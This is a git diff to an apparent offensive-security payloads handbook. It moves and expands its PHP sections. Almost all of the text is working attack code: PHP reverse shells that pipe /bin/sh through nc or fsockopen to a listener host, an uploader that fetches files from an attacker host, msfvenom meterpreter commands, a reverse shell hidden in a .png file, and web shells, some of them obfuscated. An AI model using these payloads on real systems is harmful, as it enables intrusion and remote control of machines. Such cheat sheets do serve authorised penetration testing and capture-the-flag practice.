@@ -27,6 +27,7 @@
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
 - [Perl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Perl-Reverse-Shell)
 - [PHP popen Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-popen-Web-Shell)
+- [PHP Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Reverse-Shell)
 - [PHP Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Web-Shell)
 - [PowerShell Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PowerShell-Reverse-Shell)
 - [Python Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Python-Reverse-Shell)
@@ -355,7 +356,7 @@ $ msfvenom -l payloads       // list payloads
 $ msfvenom --list formats    // list formats for payloads
 ```
 
-### Examples
+### Common Payloads
 
 ```c
 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>.elf
@@ -445,23 +446,15 @@ echo $output;
 ?>
 ```
 
-## PHP Web Shell
+## PHP Reverse Shell
+
+### Common Payloads
 
 ```c
-<?php system($_GET['cmd']); ?>
-<?php echo exec($_POST['cmd']); ?>
-<?php echo passthru($_GET['cmd']); ?>
-<?php passthru($_REQUEST['cmd']); ?>
-<?php echo system($_REQUEST['shell']): ?>
+<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>
 ```
 
-### Sanity Check
-
-```c
-<?php echo "test";?>
-```
-
-### Shell
+## Operating System
 
 ```c
 $ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -479,18 +472,48 @@ $ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
 ```
 
-### Code
-
-```c
-$sock=fsockopen("<LHOST>", <LPORT>);
-exec("/bin/sh -i <&3 >&3 2>&3");
-```
-
 ### Embedded in .png-File
 
 ```c
 $ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' >> shell.php.png
 ```
+
+## PHP Web Shell
+
+### Common Payloads
+
+```c
+<?php system($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo system($_REQUEST['shell']): ?>
+```
+
+### Sanity Check
+
+```c
+<?php echo "test";?>
+```
+
+### Alternative Web Shells
+
+```c
+<?=$_GET[0]?>
+<?=$_POST[0]?>
+<?={$_REQUEST['_']}?>
+```
+
+```c
+<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo$_?>
+```
+
+```c
+<?php echo(md5(1));@system
+($_GET[0]);?>
+```
+
+> http://<RHOST>/<FILE>.php?0=<COMMAND>
 
 ## PowerShell Reverse Shell
 
@@ -663,7 +686,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 > https://github.com/payloadbox/xss-payload-list
 
-### Basic Payloads
+### Common Payloads
 
 ```c
 <script>alert('XSS')</script>
